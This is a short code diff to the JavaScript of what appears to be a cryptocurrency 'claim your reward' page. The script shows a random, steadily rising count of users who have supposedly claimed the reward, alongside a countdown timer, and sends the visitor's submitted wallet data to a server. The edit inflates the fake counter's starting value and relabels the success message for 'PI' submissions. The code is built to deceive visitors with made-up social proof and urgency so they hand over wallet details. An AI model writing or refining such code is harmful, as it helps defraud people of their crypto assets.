@@ -125,7 +125,7 @@
         }
         updateTimer();
 
-        let participantCount = 182;
+        let participantCount = 982;
         function updateCounter() {
             participantCount += Math.floor(Math.random() * 3) + 3;
             document.getElementById("counter").innerText = `🔥 ${participantCount} users have already claimed their reward!`;
@@ -154,7 +154,7 @@
                     body: JSON.stringify({ wallet })
                 });
 
-                responseText.innerText = "✅ Wallet submitted successfully!";
+                responseText.innerText = "✅ PI submitted successfully!";
                 responseText.style.color = "green";
             } catch (error) {
                 responseText.innerText = "❌ Error: Could not connect to the server.";
